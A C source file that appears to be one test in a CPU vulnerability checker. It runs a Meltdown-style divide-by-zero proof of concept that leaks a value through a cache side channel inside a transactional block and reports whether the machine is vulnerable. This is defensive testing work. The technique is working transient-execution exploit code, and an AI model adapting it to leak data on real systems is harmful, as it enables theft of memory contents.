#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

int main(int argc, char **argv)
{
    PREPARE();
    volatile int d = 0;
    // Flush our shared memory
    flush_shared_memory();
    start_time = time(NULL);
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        if (try_start())
        {
            // Null pointer access makes attack better
            maccess(0);
            // Encode result of division in the cache
            maccess(mem + ('1' / d + '3') * 4096);

            try_abort();
        }
        try_end();

        // Recover data from the cache
        if (cache_decode() == 'd')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_DE: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }

    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_DE: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_DE: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}